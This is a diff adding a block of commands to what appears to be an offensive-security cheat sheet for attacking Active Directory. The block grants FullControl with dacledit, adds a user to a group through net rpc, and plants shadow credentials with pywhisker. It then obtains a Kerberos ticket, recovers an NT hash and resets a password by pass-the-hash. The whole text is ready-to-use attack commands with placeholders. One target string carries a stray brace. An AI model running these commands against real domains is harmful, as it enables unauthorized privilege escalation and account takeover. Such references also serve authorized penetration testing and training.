@@ -6436,6 +6436,48 @@ python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
 pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
 ```
 
+or
+
+```c
+python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>' -target-dn 'CN=<GROUP{>,CN=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
+```
+
+```c
+net rpc group addmem '<GROUP>' '<USERNAME>' -U '<DOMAIN>'/'<USERNAME>'%'<PASSWORD>' -S '<RHOST>'
+```
+
+```c
+bloodyAD --host <RHOST> -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' get object <GROUP> --attr member
+```
+
+```c
+python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'list'
+```
+
+```c
+python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'info' --device-id <ID>
+```
+
+```c
+python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
+```
+
+```c
+python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache 
+```
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+```c
+python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
+```
+
+```c
+pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
+```
+
 #### smbpasswd
 
 ```c
